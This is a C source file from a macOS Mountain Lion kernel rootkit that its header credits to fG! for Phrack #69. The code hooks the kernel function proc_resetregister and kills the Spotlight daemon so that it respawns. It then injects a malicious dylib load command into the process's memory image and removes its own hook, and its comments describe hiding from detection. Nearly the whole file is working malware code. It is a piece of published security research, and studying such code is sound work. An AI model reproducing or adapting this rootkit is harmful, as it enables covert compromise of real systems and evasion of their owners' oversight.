/*
 *   _____   _                          ___     _      _  _     _              __ _
 *  |_   _| | |_      ___      o O O   | __|   | |    | || |   (_)    _ _     / _` |
 *    | |   | ' \    / -_)    o        | _|    | |     \_, |   | |   | ' \    \__, |
 *   _|_|_  |_||_|   \___|   TS__[O]  _|_|_   _|_|_   _|__/   _|_|_  |_||_|   |___/
 * _|"""""|_|"""""|_|"""""| {======|_| """ |_|"""""|_| """"|_|"""""|_|"""""|_|"""""|
 * "`-0-0-'"`-0-0-'"`-0-0-'./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *            ___      _
 *    o O O  / __|    (_)      _ _    __     _  _     ___
 *   o      | (__     | |     | '_|  / _|   | +| |   (_-<
 *  TS__[O]  \___|   _|_|_   _|_|_   \__|_   \_,_|   /__/_
 *  {======|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|
 * ./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *
 * And now for something completely different...
 *
 * A Mountain Lion rootkit for Phrack #69!
 *
 * Copyright (c) fG!, 2012, 2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * exec_userland_cmd.c
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include "exec_userland_cmd.h"

#include <sys/param.h>
#include <sys/malloc.h>
#include <sys/dirent.h>
#include <mach-o/loader.h>

#include "kernel_info.h"
#include "cpu_protections.h"
#include "configuration.h"
#include "hijacking_utils.h"
#include "proc_utils.h"
#include "function_pointers.h"
#include "kernel_IOUserClient.h"
/* other definitions we need to import */
#define P_LREGISTER	0x00800000	/* thread start fns registered  */
#define proc_lock(p)		lck_mtx_lock(&(p)->p_mlock)
#define proc_unlock(p)      lck_mtx_unlock(&(p)->p_mlock)
#define PROC_NULL (proc_t)0

extern struct kernel_info g_kernel_info;
// buffer to store the original bytes, we will XOR'em, no need to store in clear :)
char g_orig_bytes[TRAMPOLINE_SIZE];

// local functions
//static vm_prot_t get_protection(vm_map_t task, mach_vm_address_t address);
static int find_library_injection_space(char *header);

#pragma The public function that will inject the library and execute it

/*
 * execute a user command via dynamic library injection into a (respawned) process controlled by launchd
 * first we need to patch proc_resetregister() and redirect to our own implementation
 * and then we kill the process
 * after successful execution we can unpatch to leave no traces behind
 */
kern_return_t
execute_user_command(void)
{
    kern_return_t kr = 0;
    // we need to find the pid of the process we want to kill
    // in this example we are going to kill spotlight daemon
    proc_t target_proc = find_proc_by_name(PIGGYBACK_PROCESS);
    if (target_proc == PROC_NULL) return KERN_FAILURE;
    // patch proc_resetregister - we assume it's not already hooked when we execute this
    kr = install_trampoline(EXECMD_TRAMPOLINE_FUNCTION, (mach_vm_address_t)tfc_proc_resetregister, (void*)g_orig_bytes);
    if (kr) return KERN_FAILURE;
    // kill and let it execute - Spotlight daemon is crash happy, right?
    if (_psignal == NULL) _psignal = (void*)solve_kernel_symbol(&g_kernel_info, "_psignal");
    _psignal(target_proc, SIGSEGV);
    // now the hook on proc_resetregister will take care of everything
    return KERN_SUCCESS;
}

#pragma mark Hijacked function(s)

/*
 * our implementation of proc_resetregister that will inject the library when target process is respawn
 */
void
tfc_proc_resetregister(proc_t p)
{
    // the procname is already set in the proc structure so we can get it
    char processname[MAXCOMLEN+1];
    proc_name(p->p_pid, processname, sizeof(processname));
    // do our magic if we are dealing with the piggyback process
    if (strcmp(processname, PIGGYBACK_PROCESS) == 0)
    {
        // solve symbols we need
        if (_task_suspend == NULL) _task_suspend = (void*)solve_kernel_symbol(&g_kernel_info, "_task_suspend");
        if (_vm_map_read_user == NULL) _vm_map_read_user = (void*)solve_kernel_symbol(&g_kernel_info, "_vm_map_read_user");
        if (_vm_map_write_user == NULL) _vm_map_write_user = (void*)solve_kernel_symbol(&g_kernel_info, "_vm_map_write_user");
        if (_mach_vm_protect == NULL) _mach_vm_protect = (void*)solve_kernel_symbol(&g_kernel_info, "_mach_vm_protect");

        // we find out the start address of the process from the vm_map list
        // the start field has the lower address of the process
        struct task *task = (struct task*)(p->task);
        vm_map_t task_port = (vm_map_t)task->map;
        mach_vm_address_t start_address = task->map->hdr.links.start;
        kern_return_t kr = 0;

        // prepare the LC_LOAD_DYLIB command to be injected
        struct dylib_command dl = { 0 };
        dl.cmd = LC_LOAD_DYLIB;
        dl.dylib.name.offset = 24;         // usually the name string is located just after the command
        dl.dylib.timestamp = 0;            // these 3 fields should be set to something meaningful and less suspicious
        dl.dylib.current_version = 0;
        dl.dylib.compatibility_version = 0;
        dl.cmdsize = sizeof(struct dylib_command) + (uint32_t)strlen(INJECTED_LIBRARY) + 1;

        /*
         * we need to read the header of the piggyback process so we can find the injection space and modify it
         * NOTE: implementation is against 64bits only targets but you can easily add 32bits ones
         */
        struct mach_header_64 header = { 0 };
        kr = _vm_map_read_user(task_port, start_address, (void*)&header, sizeof(header));
        if (kr || header.magic != MH_MAGIC_64)
        {
#if DEBUG
            //moony_modify//printf("[ERROR] target address not a valid mach-o or couldn't read\n");
#endif
            goto original_function;
        }
        // calculate the buffer size we will need, including the command to be injected
        uint32_t total_header_size = header.sizeofcmds + sizeof(struct mach_header_64) + dl.cmdsize;
        char *full_header = _MALLOC(total_header_size, M_TEMP, M_ZERO);
        kr = _vm_map_read_user(task_port, start_address, (void*)full_header, total_header_size);

        struct mach_header_64 *mh = (struct mach_header_64*)full_header;
        if (kr || mh->magic != MH_MAGIC_64)
        {
#if DEBUG
            //moony_modify//printf("[ERROR] failure while reading full buffer!\n");
#endif
            goto cleanup;
        }
        // XXX: overflow this value and crash us ?
        // XXX: this function is not stable enough, read its comments
        int free_space = find_library_injection_space(full_header);

        if (free_space < dl.cmdsize)
        {
#if DEBUG
            //moony_modify//printf("[ERROR] not enough space to inject library into %s!\n", processname);
#endif
            goto cleanup;
        }
        // the injection position is after the last command
        uint32_t injection_pos = mh->sizeofcmds + sizeof(struct mach_header_64);
        // fix mach-o header
        mh->ncmds += 1;
        mh->sizeofcmds += dl.cmdsize;
        // inject the library into the header buffer
        memcpy(full_header + injection_pos, &dl, sizeof(struct dylib_command));
        strlcpy((char*)(full_header + injection_pos + sizeof(struct dylib_command)), INJECTED_LIBRARY, strlen(INJECTED_LIBRARY)+1);
        // read current protection so we can restore it
        // this will avoid any diff'ing of permissions to potentially detect us
        vm_prot_t old_protection = get_protection(task_port, start_address);
        vm_prot_t new_protection = VM_PROT_WRITE | VM_PROT_READ;
        mach_msg_type_number_t len = total_header_size;
        if (_mach_vm_protect(task_port, start_address, len, FALSE, new_protection))
        {
#if DEBUG
            //moony_modify//printf("[ERROR] vm_protect to write failed!\n");
#endif
            goto cleanup;
        }
        // different ways to write to userland processes - a bit ugly with these ifs
#if USERLAND_WRITE == 0 // mode 0 = use vm_map_write_user, the easiest method
        if (_vm_map_write_user(task_port, (void*)full_header, start_address, total_header_size))
        {
#if DEBUG
            //moony_modify//printf("[ERROR] write of modified header failed!\n");
#endif
            // we want to try to protect again the memory segment else it will end real bad!
        }
        
#elif USERLAND_WRITE == 1 // mode 1 = use mach_vm_copy
        proc_t p_kernel = proc_find(0);
        task_t kernel_task = (task_t)p_kernel->task;
        vm_map_copy_t copy;
        vm_map_address_t dst_user_addr;
        // create a vm_map_copy_t object so we can insert it at userland process
        if (_vm_map_copyin == NULL) _vm_map_copyin = (void*)solve_kernel_symbol(&g_kernel_info, "_vm_map_copyin");
        if (_vm_map_copyout == NULL) _vm_map_copyout = (void*)solve_kernel_symbol(&g_kernel_info, "_vm_map_copyout");
        if (_mach_vm_copy == NULL) _mach_vm_copy = (void*)solve_kernel_symbol(&g_kernel_info, "_mach_vm_copy");
        
        kr = _vm_map_copyin((vm_map_t)kernel_task->map, (vm_map_address_t)full_header, total_header_size, FALSE, &copy);
        if (kr) goto localcleanup;
        kr = _vm_map_copyout((vm_map_t)task->map, &dst_user_addr, copy);
        if (kr) goto localcleanup;
        kr = _mach_vm_copy((vm_map_t)task->map, CAST_USER_ADDR_T(dst_user_addr), total_header_size, start_address);
        if (kr)
        {
#if DEBUG
            //moony_modify//printf("[ERROR] mach_vm_copy failed!\n");
#endif
        }
localcleanup:
        proc_rele(p_kernel);
        
#elif USERLAND_WRITE == 2 // mode 2 = use copyout
        if (copyout(full_header, start_address, total_header_size))
        {
#if DEBUG
            //moony_modify//printf("[ERROR] copyout failed!\n");
#endif
        }
#endif
        
        // restore original protection
        if (_mach_vm_protect(task_port, start_address, len, FALSE, old_protection))
        {
#if DEBUG
            //moony_modify//printf("[ERROR] vm_protect to original prot failed!\n");
#endif
        }

cleanup:
        _FREE(full_header, M_TEMP);
        // clean up - remove trampoline from proc_resetregister
        if (remove_trampoline(EXECMD_TRAMPOLINE_FUNCTION, (void*)g_orig_bytes))
        {
#if DEBUG
            //moony_modify//printf("[ERROR] trampoline removal failed!\n");
#endif
        }
    }
    // the original function code
original_function:
	proc_lock(p);
	p->p_lflag &= ~P_LREGISTER;
	proc_unlock(p);
}

#pragma Local helper functions

/*
 * verify if there's enough free header space to inject the new command
 * return the available amount else -1
 *
 * XXX: we are being very simplistic in this approach here and assume __text is always the first data
 *      after the mach-o header. this is not robust enough and to make it very stable we should
 *      lookup the command that will have data first. can be at least the LC_SEGMENT or LC_ENCRYPTION_INFO.
 */
static int
find_library_injection_space(char *header)
{
    uint32_t text_section_off = 0;
    struct mach_header_64 *mh = (struct mach_header_64*)header;
    // find the last command offset
    struct load_command *load_cmd = NULL;
    char *load_cmd_addr = (char*)header + sizeof(struct mach_header_64);

    for (uint32_t i = 0; i < mh->ncmds; i++)
    {
        load_cmd = (struct load_command*)load_cmd_addr;

        if (load_cmd->cmd == LC_SEGMENT_64)
        {
            struct segment_command_64 *seg_cmd = (struct segment_command_64*)load_cmd_addr;
            if (strncmp(seg_cmd->segname, "__TEXT", 16) == 0)
            {
                // address of the first section
                char *section_addr = load_cmd_addr + sizeof(struct segment_command_64);
                struct section_64 *section_cmd = NULL;
                // iterate thru all sections
                for (uint32_t x = 0; x < seg_cmd->nsects; x++)
                {
                    section_cmd = (struct section_64*)section_addr;
                    if (strncmp(section_cmd->sectname, "__text", 16) == 0)
                    {
                        // retrieve the offset for this section
                        text_section_off = section_cmd->offset;
#if DEBUG
                        //moony_modify//printf("[DEBUG] 64bits __text section address %x\n", text_section_off);
#endif
                        break;
                    }
                    section_addr += sizeof(struct section_64);
                }
            }
        }
        // advance to next command, size field holds the total size of each command, including sections
        load_cmd_addr += load_cmd->cmdsize;
    }

    // the free header space is the difference between the location of the first code
    // and the segment commands end position
    uint32_t header_size = mh->sizeofcmds + sizeof(struct mach_header_64);
    int free_space = text_section_off - header_size;
    
    if (free_space > 0) return free_space;
    
    return -1;
}


